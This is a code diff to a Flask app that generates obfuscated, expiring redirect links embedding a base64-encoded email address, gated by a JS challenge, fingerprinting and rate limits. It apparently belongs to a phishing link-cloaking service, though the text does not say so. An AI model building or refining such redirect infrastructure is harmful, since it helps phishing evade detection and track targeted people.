@@ -709,7 +709,7 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                path_segment = f"{randomstring1}/{base64email}/{randomstring2}"
+                path_segment = f"{randomstring1}{base64email}{randomstring2}"
                 endpoint = generate_random_string(16)
                 random_suffix = secrets.token_hex(32)
                 expiry_timestamp = int(time.time()) + expiry
@@ -726,7 +726,7 @@ def dashboard():
                     error = "Failed to encrypt payload"
 
                 if not error:
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{urllib.parse.quote(endpoint)}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}/{urllib.parse.quote(random_suffix)}"
+                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{urllib.parse.quote(endpoint)}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment)}/{urllib.parse.quote(random_suffix)}"
                     url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
                         try:
@@ -1676,7 +1676,7 @@ def export(index):
 def challenge():
     try:
         data = request.get_json()
-        if not data or 'checkpoint' not in data or not isinstance(data['checkpoint'], (int, float)):
+        if not data or 'challenge' not in data or not isinstance(data['challenge'], (int, float)):
             logger.warning("Invalid JS challenge")
             return {"status": "denied"}, 403
         session['js_verified'] = True
@@ -1705,7 +1705,7 @@ def fingerprint():
         logger.error(f"Error in fingerprint: {str(e)}", exc_info=True)
         return {"status": "error"}, 500
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>/<random_suffix>", methods=["GET"], subdomain="<username>")
+@app.route("/<endpoint>/<path:encrypted_payload>/<path_segment>/<random_suffix>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment, random_suffix):
     try:
@@ -1855,7 +1855,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment, random
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
-        final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
+        final_url = redirect_url.rstrip('/')
         logger.info(f"Redirecting to {final_url}")
         return redirect(final_url, code=302)
     except Exception as e:
